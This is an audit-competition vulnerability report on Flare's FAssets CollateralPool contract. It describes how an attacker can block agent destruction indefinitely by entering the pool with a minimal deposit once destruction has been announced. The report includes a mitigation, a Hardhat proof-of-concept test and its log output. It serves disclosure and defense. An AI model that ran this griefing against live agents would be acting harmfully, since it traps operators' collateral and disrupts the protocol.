# #46838 \[SC-Low] Agent Destruction Can Be Blocked by Malicious Collateral Pool Entries

**Submitted on Jun 5th 2025 at 07:03:35 UTC by @Bluedragon for** [**Audit Comp | Flare | FAssets**](https://immunefi.com/audit-competition/audit-comp-flare-fassets)

* **Report ID:** #46838
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/implementation/CollateralPool.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary:

The CollateralPool system allows users to enter the pool even when the associated agent is in the "destroying" state. This creates a griefing attack vector where malicious actors can prevent legitimate agent destruction by entering the pool after an agent announces destruction, causing the destroy operation to fail due to the requirement that pool token supply must be zero for successful destruction.

## Vulnerability Details:

The vulnerability exists in the pool entry validation logic. When examining the `CollateralPool::enter()` , there's no check to prevent entry when the agent is in a destroying state.

The agent destruction process requires that the collateral pool token supply be zero, but the current implementation allows new entries even after destruction has been announced. This is evident from the entry function which only validates minimum NAT amounts and pool state but doesn't check the agent's destruction status.

**Scenario (step by step):**

1. **Agent Announces Destruction**:
   * Agent calls `announceDestroyAgent()` and enters destroying state
   * Agent waits for the required `withdrawalWaitMinSeconds` period
2. **Attacker Intervention**:
   * Malicious actor monitors for agents in destroying state
   * Just before the agent attempts to call `destroyAgent()`, attacker enters the pool
   * Pool token supply becomes non-zero
3. **Destruction Failure**:
   * Agent attempts to destroy the vault
   * Destruction fails due to non-zero pool token supply requirement
   * Agent remains stuck in destroying state
4. **Continuous Griefing**:
   * Attacker can repeat this process indefinitely
   * Each attack only requires minimal NAT deposit (MIN\_NAT\_TO\_ENTER)
   * Agent cannot complete destruction process

## Impact:

* **Agent Destruction Prevention**: Legitimate agents cannot complete the destruction process
* **Griefing Attack Vector**: Malicious actors can continuously prevent agent destruction with minimal cost
* **Operational Disruption**: Agents become stuck in the destroying state indefinitely
* **Economic Harassment**: Attackers can force agents to maintain collateral longer than intended

## Recommended Mitigation:

Add a check in the `enter` function to prevent pool entry when the agent is in destroying state:

```solidity
function enter(uint256 _fAssets, bool _enterWithFullFAssets)
    external payable
    nonReentrant
    returns (uint256, uint256)
{
    // Get agent status and check if destroying
    Agent.State storage agent = Agent.get(agentVault);
    require(agent.status != Agent.Status.DESTROYING, "cannot enter pool while agent is destroying");

    // ... rest of existing enter logic
}
```

This simple check would prevent the griefing attack by blocking pool entry when the agent has announced destruction, ensuring that agents can complete the destruction process without interference.

## Proof of Concept

## Proof of Concept

1. Add the following test to the `Redemption.ts` in `test/unit/fasset/library/` directory
2. Run the test using `yarn testHH`

```ts
it.only("Attacker can grief agents from destroying", async () => {
  const feeBIPS = toBIPS("10%");
  const poolFeeShareBIPS = toBIPS("1%");
  const agentVault = await createAgent(agentOwner1, underlyingAgent1, {
    feeBIPS,
    poolFeeShareBIPS,
  });
  await depositCollateral(agentOwner1, agentVault, toWei(3e8));
  const info = await assetManager.getAgentInfo(agentVault.address);

  console.log("==== Agent is going to be destroyed ====");
  console.log("Agent total Minted UBA: ", info.mintedUBA.toString());

  // Get the collateral pool address for agentVault1 and create an instance of CollateralPool
  const collateralPool = await CollateralPool.at(info.collateralPool);
  const ONE_ETH = new BN("1000000000000000000");
  // Get the pool token address and create an instance of CollateralPoolToken
  const poolToken = await CollateralPoolToken.at(info.collateralPoolToken);
  console.log(
    "Agent collateral pool token total supply: ",
    (await poolToken.totalSupply()).toString()
  );

  // After sufficient operations agent is getting destroyed
  console.log("\n==== Agent Announced Destroy ====");
  const res = await assetManager.announceDestroyAgent(agentVault.address, {
    from: agentOwner1,
  });
  const args = filterEvents(res, "AgentDestroyAnnounced").map((e) => e.args);
  console.log("Agent destroy time lock: ", args[0].destroyAllowedAt.toString());

  // skip to agent destroy time lock
  await deterministicTimeIncrease(
    toBN(settings.withdrawalWaitMinSeconds).add(toBN("1"))
  );

  // Attacker can grief agent from destroying
  console.log("\n==== Attacker Enters Collateral Pool ====");
  await collateralPool.enter(0, false, {
    from: minterAddress1,
    value: ONE_ETH,
  });
  const balance = await poolToken.balanceOf(minterAddress1);
  const newTotalSupply = await poolToken.totalSupply();
  console.log("Attacker pool token balance: ", balance.toString());
  console.log("New pool token total supply: ", newTotalSupply.toString());

  console.log("\n==== Agents Destroy Fails ====");
  // Now agent destroy will fail
  const result = assetManager.destroyAgent(agentVault.address, agentOwner1, {
    from: agentOwner1,
  });
  await expectRevert(result, "cannot destroy a pool with issued tokens");
  const info2 = await assetManager.getAgentInfo(agentVault.address);
  console.log(
    "Agent status : ",
    info2.status,
    " (4 means destroying thus agent is not destroyed yet)"
  );
});
```

**Logs**

```ts
 Contract: Redemption.sol; test/unit/fasset/library/Redemption.ts; Redemption basic tests
==== Agent is going to be destroyed ====
Agent total Minted UBA:  0
Agent collateral pool token total supply:  0

==== Agent Announced Destroy ====
Agent destroy time lock:  1749106605

==== Attacker Enters Collateral Pool ====
Attacker pool token balance:  1000000000000000000
New pool token total supply:  1000000000000000000

==== Agents Destroy Fails ====
Agent status :  4  (4 means destroying thus agent is not destroyed yet)
    ✔ Attacker can grief agents from destroying (415ms)
```
